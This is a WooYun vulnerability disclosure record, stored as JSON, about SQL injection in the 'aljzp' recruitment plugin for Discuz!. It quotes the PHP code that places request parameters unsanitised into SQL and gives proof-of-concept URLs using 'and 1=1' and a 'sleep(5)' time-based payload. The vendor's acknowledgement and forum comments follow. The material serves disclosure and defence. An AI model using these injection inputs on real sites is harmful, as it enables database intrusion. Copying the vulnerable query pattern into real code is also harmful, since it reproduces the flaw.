{"id": 49929, "wybug_id": "wooyun-2014-079582", "wybug_title": "Discuz! 某插件sql注射(高版本积累，低版本无限制)", "wybug_corp": "Discuz!", "wybug_author": "menmen519", "wybug_date": "2014-10-16 12:01", "wybug_open_date": "2015-01-14 12:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向公众公开  简要描述： Discuz! 某插件sql注射(高版本积累，低版本无限制) 详细说明：  这个其实上次已经发过，但是没有写好，这里我就重新写一次这个插件属于亮剑系列的招聘模块：aljzp.inc.php:\n}else if($_GET['act'] == 'touid'){\tif(!$_G['uid']){\t\tshowmessage(lang('plugin/aljzp','aljzp_1'), '', array(), array('login' => true));\t}\tif(!DB::result_first(\"select sign from \".DB::table('aljzp_getresume').\" where id=\".$_GET['gid'])){\t\tDB::update('aljzp_getresume',array('sign'=>1),'id='.$_GET[gid]);\t\tDB::update('aljzp_sentresume',array('sign'=>1),'id='.$_GET[sid]);\t}\t$regions = C::t('#aljzp#aljzp_region')->range();    $pos = C::t('#aljzp#aljzp_position')->range();\t$lp\t=C::t('#aljzp#aljzp_resume')->fetch($_GET['uid']);\tinclude template('aljzp:touid');}else if ($_GET['act'] == 'reflash') {\n看到这一句：!DB::result_first(\"select sign from \".DB::table('aljzp_getresume').\" where id=\".$_GET['gid'])这里直接进入到了sql查询里面，我们看看 访问一下url：http://localhost/Discuz_X3.2_SC_UTF8/upload/plugin.php?id=aljzp&act=touid&gid=1%20and%201=1后台抓取sql语句为\n\n这里就不多说了 3.2绕过没有过多的研究，但是3.2之前的通过这里完全可以采用报错注入这里我们安装一个2.5 版本 并且升级到最新，然后只做一个测试http://127.0.0.1:81/plugin.php?id=aljzp&act=touid&gid=sleep(5)这个是打过补丁的2.5 但是还是漏掉的sleep函数延迟5秒即可   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-16 12:03 厂商回复： 感谢您提供的信息，我们尽快联系插件作者进行修正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-16 12:47 |    \t\tieasyi \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  又一发。    \n     2014-10-16 13:07 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  发射    \n     2014-10-17 10:44 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  @Discuz! 感谢你妹，有种你发补丁啊！四个月没正式发补丁，还确认你妹啊！    \n     2014-10-17 10:55 |    \t\tmenmen519 \t\t\t( 普通白帽子  |\t\t\t        Rank:762 漏洞数:146        | http://menmen519.blog.sohu.com/)\t\t \n  @Hmily 这么激动的 ！！！！    \n     2014-10-17 11:30 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  @menmen519 说明怨恨积攒太多了。。。    \n     2014-10-23 13:17 |    \t\tmapleeve \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 枫林晚矣)\t\t \n  menmen嫁给我    \n     2014-11-10 21:48 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Hmily 大牛，为何你对DZ那么有感觉…………    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}